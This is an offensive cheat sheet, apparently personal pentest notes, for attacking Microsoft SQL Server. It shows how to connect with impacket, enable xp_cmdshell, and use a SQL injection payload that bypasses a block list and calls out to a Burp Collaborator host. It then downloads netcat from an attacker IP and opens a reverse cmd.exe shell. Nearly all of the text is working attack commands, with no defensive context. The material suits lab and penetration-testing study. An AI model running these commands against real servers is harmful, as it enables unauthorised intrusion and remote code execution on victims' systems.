# MSSQL

Connect to MSSQL instance with impacket-mssqlclient

```
impacket-mssqlclient machine_name/user@[IP] -windows-auth
```

Enable xp\_cmdshell

```
#this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

# Bypass blackisted "EXEC xp_cmdshell"
‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —
```

Check what role the user has on the server

```
SQL> SELECT is_srvrolemember('sysadmin');
              

-----------   

          1   
```

Download netcat  to the victim and  create a reverse shell

```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 443"
```
